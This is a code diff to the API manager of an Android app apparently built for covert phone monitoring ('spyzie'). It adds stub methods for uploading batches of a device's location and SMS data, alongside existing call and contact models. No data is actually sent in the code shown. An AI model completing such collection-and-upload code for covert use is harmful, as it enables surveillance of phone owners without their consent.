@@ -1,10 +1,10 @@
 package com.tantd.spyzie.data.network;
 
+import android.content.Context;
 import android.util.Log;
 
 import com.rx2androidnetworking.Rx2AndroidNetworking;
-import com.tantd.spyzie.data.db.AppDbManager;
-import com.tantd.spyzie.data.db.DbManager;
+import com.tantd.spyzie.SpyzieApplication;
 import com.tantd.spyzie.data.model.Call;
 import com.tantd.spyzie.data.model.Contact;
 import com.tantd.spyzie.data.model.Error;
@@ -12,11 +12,9 @@ import com.tantd.spyzie.data.model.Event;
 import com.tantd.spyzie.data.model.Location;
 import com.tantd.spyzie.data.model.Sms;
 import com.tantd.spyzie.util.Constants;
+import com.tantd.spyzie.util.JsonUtil;
 
-import java.util.ArrayList;
 import java.util.List;
-
-import javax.inject.Inject;
 
 import io.reactivex.Single;
 
@@ -25,8 +23,7 @@ import io.reactivex.Single;
  */
 public class AppApiManager implements ApiManager {
 
-    @Inject
-    DbManager dbManager;
+    private Context mContext;
 
     private static final String DEBUG_SUB_TAG = "[" + AppApiManager.class.getSimpleName() + "] ";
 
@@ -40,6 +37,7 @@ public class AppApiManager implements ApiManager {
     }
 
     private AppApiManager() {
+        mContext = SpyzieApplication.getInstance();
     }
 
     @Override
@@ -50,22 +48,44 @@ public class AppApiManager implements ApiManager {
 
     @Override
     public void sendLocationData(Location location) {
-        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendLocationData, lat=" + location.lat + ", lon=" + location.lon);
-        // TODO: Use Rx2AndroidNetworking to post location data to server
+        if (Constants.IS_DEBUG_MODE) {
+            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendLocationData, lat=" + location.lat + ", lon=" + location.lon);
+        }
+    }
 
+    @Override
+    public void sendLocationData(List<Location> locations) {
+        String json = JsonUtil.getInstance().toJson(locations);
+        if (Constants.IS_DEBUG_MODE) {
+            Log.d(Constants.LOG_TAG + "A", DEBUG_SUB_TAG + "sendLocationData, size=" + locations.size());
+            Log.d(Constants.LOG_TAG + "A", DEBUG_SUB_TAG + "sendLocationData, json=" + json);
+        }
+        if (Constants.IS_API_ACIVE) {
 
+        } else {
+
+        }
     }
 
     @Override
     public void sendSmsData(Sms sms) {
-        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendSmsData: " + sms.toString());
+        if (Constants.IS_DEBUG_MODE) {
+            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendSmsData: " + sms.toString());
+        }
         // TODO: implement here
+    }
+
+    @Override
+    public void sendSmsData(List<Sms> sms) {
+
     }
 
     @Override
     public void sendExceptionTracking(Error error) {
         // TODO: implement here
-        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendExceptionTracking, error=" + error + ", errorValue=" + error.ordinal());
+        if (Constants.IS_DEBUG_MODE) {
+            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendExceptionTracking, error=" + error + ", errorValue=" + error.ordinal());
+        }
     }
 
     @Override
@@ -79,22 +99,24 @@ public class AppApiManager implements ApiManager {
         // TODO: implement here
         print(calls);
 
-        int COUNT = 100000;
-        List<Location> locations = new ArrayList<>();
-        for (int i = 0; i < COUNT; i++) {
-            locations.add(new Location(21.0166988, 105.7817053));
-        }
-
-        dbManager = AppDbManager.getInstance();
-        if (dbManager == null) {
-            Log.d(Constants.LOG_TAG + "A", "dbManager null");
-            return;
-        }
-        dbManager.put(locations);
-        Log.d(Constants.LOG_TAG + "A", "find location data start");
-        long startTime = System.currentTimeMillis();
-        List<Location> ret = dbManager.findAll(Location.class);
-        Log.d(Constants.LOG_TAG + "A", "find location data finish, elapsed time=" + (System.currentTimeMillis() - startTime));
+//        int COUNT = 5000000;
+//        Log.d(Constants.LOG_TAG + "A", "start creating list of location");
+//        List<Location> locations = new ArrayList<>();
+//        for (int i = 0; i < COUNT; i++) {
+//            locations.add(new Location(21.0166988, 105.7817053));
+//        }
+//
+//        dbManager = AppDbManager.getInstance();
+//        if (dbManager == null) {
+//            Log.d(Constants.LOG_TAG + "A", "dbManager null");
+//            return;
+//        }
+//        dbManager.putLocations(locations);
+//        Log.d(Constants.LOG_TAG + "A", "find location data start");
+//        long startTime = System.currentTimeMillis();
+//        List<?> ret = dbManager.findAll(Location.class);
+//        Log.d(Constants.LOG_TAG + "A", "find location data finish, elapsed time=" + (System.currentTimeMillis() - startTime)
+//                + ", ret size=" + ret.size());
     }
 
     private <T> void print(List<T> objects) {
